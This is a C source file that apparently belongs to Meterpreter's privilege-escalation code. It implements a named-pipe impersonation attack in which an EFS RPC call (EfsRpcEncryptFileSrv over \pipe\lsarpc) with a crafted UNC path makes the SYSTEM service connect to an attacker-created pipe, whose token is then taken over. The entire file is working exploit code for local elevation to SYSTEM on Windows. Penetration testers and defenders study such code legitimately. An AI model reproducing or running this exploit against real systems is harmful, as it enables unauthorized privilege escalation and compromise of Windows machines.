#include "precomp.h"
#include "common_metapi.h"
#include "namedpipe.h"

typedef NTSTATUS(WINAPI* PRtlGetVersion)(LPOSVERSIONINFOEXW);

RPC_STATUS EfsRpcEncryptFileSrv(handle_t binding_h, wchar_t* FileName);

DWORD WINAPI trigger_efs_connection(LPWSTR pPipeName);
handle_t efs_bind(wchar_t* target);

const RPC_WSTR MS_EFSR_UUID = (RPC_WSTR)L"c681d488-d850-11d0-8c52-00c04fd90f7e";
const RPC_WSTR LSARPC_NAMEDPIPE = (RPC_WSTR)L"\\pipe\\lsarpc";

DWORD elevate_via_namedpipe_efs(Remote* remote, Packet* packet)
{
	HMODULE hNtdll = NULL;
	PRtlGetVersion pRtlGetVersion = NULL;
	OSVERSIONINFOEXW os = { 0 };
	DWORD dwResult = ERROR_SUCCESS;
	THREAD* pThread = NULL;
	HANDLE hSem = NULL;
	char cPipeName1[MAX_PATH] = { 0 };
	WCHAR cPipeName2[MAX_PATH] = { 0 };
	DWORD dwPipeUid[2] = { 0, 0 };
	PRIV_POST_IMPERSONATION PostImpersonation;

	do {
		hNtdll = GetModuleHandleA("ntdll");
		if (hNtdll == NULL) {
			BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_efs: Failed to resolve RtlGetVersion");
		}

		pRtlGetVersion = (PRtlGetVersion)GetProcAddress(hNtdll, "RtlGetVersion");
		if (pRtlGetVersion == NULL) {
			BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_efs: Failed to resolve RtlGetVersion");
		}

		if (pRtlGetVersion(&os)) {
			BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_efs: RtlGetVersion failed");
		}

		// filter out systems older than Windows Vista / Server 2008 (6.0) for this technique
		if (os.dwMajorVersion < 6) {
			SetLastError(ERROR_CALL_NOT_IMPLEMENTED);
			BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_efs: Windows versions older than 6.0 are unsupported");
		}

		// generate a pseudo random name for the pipe
		dwPipeUid[0] = ((rand() << 16) | rand());
		dwPipeUid[1] = ((rand() << 16) | rand());

		_snprintf_s(cPipeName1, sizeof(cPipeName1), MAX_PATH, "\\\\.\\pipe\\%08x%08x\\pipe\\srvsvc", dwPipeUid[0], dwPipeUid[1]);
		_snwprintf_s(cPipeName2, sizeof(cPipeName2), MAX_PATH, L"%08x%08x", dwPipeUid[0], dwPipeUid[1]);

		hSem = CreateSemaphore(NULL, 0, 1, NULL);
		PostImpersonation.pCallback = set_meterp_thread_use_current_token;
		PostImpersonation.pCallbackParam = remote;

		pThread = met_api->thread.create(elevate_namedpipe_thread, &cPipeName1, hSem, &PostImpersonation);
		if (!pThread) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_via_namedpipe_efs: met_api->thread.create failed",
				ERROR_INVALID_HANDLE);
		}

		if (!met_api->thread.run(pThread)) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_via_namedpipe_efs: met_api->thread.run failed",
				ERROR_ACCESS_DENIED);
		}

		// wait for the thread to create the pipe, if it times out terminate
		if (hSem) {
			if (WaitForSingleObject(hSem, 500) != WAIT_OBJECT_0) {
				BREAK_WITH_ERROR("[ELEVATE] elevate_via_namedpipe_efs: WaitForSingleObject failed",
					ERROR_ACCESS_DENIED);
			}
		}
		else {
			Sleep(500);
		}

		trigger_efs_connection(cPipeName2);

		// signal our thread to terminate if it is still running
		met_api->thread.sigterm(pThread);

		// and wait for it to terminate...
		met_api->thread.join(pThread);

		// get the exit code for our pthread
		dprintf("[ELEVATE] dwResult before exit code: %u", dwResult);
		if (!GetExitCodeThread(pThread->handle, &dwResult)) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_via_namedpipe_efs: GetExitCodeThread failed",
				ERROR_INVALID_HANDLE);
		}
		dprintf("[ELEVATE] dwResult after exit code: %u", dwResult);

	} while (0);

	if (pThread) {
		met_api->thread.destroy(pThread);
	}
	if (hSem) {
		CloseHandle(hSem);
	}

	return dwResult;
}

DWORD WINAPI trigger_efs_connection(LPWSTR pPipeName)
{
	RPC_STATUS hr = 0;
	LPWSTR pCaptureServer = NULL;
	handle_t ht = INVALID_HANDLE_VALUE;
	DWORD dwResult = ERROR_SUCCESS;

	do {
		pCaptureServer = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR));
		if (!pCaptureServer) {
			BREAK_WITH_ERROR("[ELEVATE] trigger_efs_connection: Out of Memory", STATUS_NO_MEMORY);
		}

		_snwprintf_s(pCaptureServer, MAX_PATH, _TRUNCATE, (LPWSTR)(L"\\\\localhost/pipe/%s/\\%s\\%s"), pPipeName, pPipeName, pPipeName);

		RpcTryExcept
			ht = efs_bind(L"localhost");
			if (ht == INVALID_HANDLE_VALUE) {
				BREAK_WITH_ERROR("[ELEVATE] trigger_efs_connection: Bind error", ERROR_INVALID_HANDLE);
			}
			hr = EfsRpcEncryptFileSrv(ht, pCaptureServer);
		RpcExcept(EXCEPTION_EXECUTE_HANDLER)
			dprintf("[ELEVATE] trigger_efs_connection: RPC Error: 0x%08x", RpcExceptionCode());
			dwResult = RPC_S_CALL_FAILED;
			break;
		RpcEndExcept

		if (hr == ERROR_BAD_NETPATH) {
			dprintf("[ELEVATE] trigger_efs_connection: Success");
		} else {
			dprintf("[ELEVATE] trigger_efs_connection: Did not receive expected output. Attack might have failed.");
		}

	} while (0);

	if (ht != INVALID_HANDLE_VALUE) {
		RpcBindingFree(ht);
	}

	if (pCaptureServer) {
		free(pCaptureServer);
	}

	return dwResult;
}

#define CHECK_RPC_STATUS_AND_RETURN(func, st) {\
	if (RpcStatus != RPC_S_OK) {\
		if (DceErrorInqTextA(RpcStatus, RpcError) == RPC_S_OK) {\
			dprintf("[ELEVATE] efs_bind - RPC error in %s: 0x%08x - %s", func, RpcStatus, RpcError);\
		} else {\
			dprintf("[ELEVATE] efs_bind - RPC error in %s: 0x%08x", func, RpcStatus);\
		}\
		return INVALID_HANDLE_VALUE;\
	}\
}

handle_t efs_bind(wchar_t* target)
{
	RPC_STATUS RpcStatus;
	unsigned char RpcError[DCE_C_ERROR_STRING_LEN];
	wchar_t buffer[MAX_PATH];
	RPC_WSTR StringBinding;
	handle_t BindingHandle;

	_snwprintf_s(buffer, MAX_PATH, _TRUNCATE, L"\\\\%s", target);
	RpcStatus = RpcStringBindingComposeW(
		MS_EFSR_UUID,
		(RPC_WSTR)L"ncacn_np",
		(RPC_WSTR)buffer,
		LSARPC_NAMEDPIPE,
		NULL,
		&StringBinding);
	CHECK_RPC_STATUS_AND_RETURN("RpcStringBindingComposeW", RpcStatus);

	RpcStatus = RpcBindingFromStringBindingW(StringBinding, &BindingHandle);
	CHECK_RPC_STATUS_AND_RETURN("RpcBindingFromStringBindingW", RpcStatus);

	RpcStatus = RpcStringFreeW(&StringBinding);
	CHECK_RPC_STATUS_AND_RETURN("RpcStringFreeW", RpcStatus);

	RpcStatus = RpcBindingSetAuthInfoW(BindingHandle, (RPC_WSTR)target, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE, NULL, RPC_C_AUTHZ_NONE);
	CHECK_RPC_STATUS_AND_RETURN("RpcBindingSetAuthInfoW", RpcStatus);

	return BindingHandle;
}
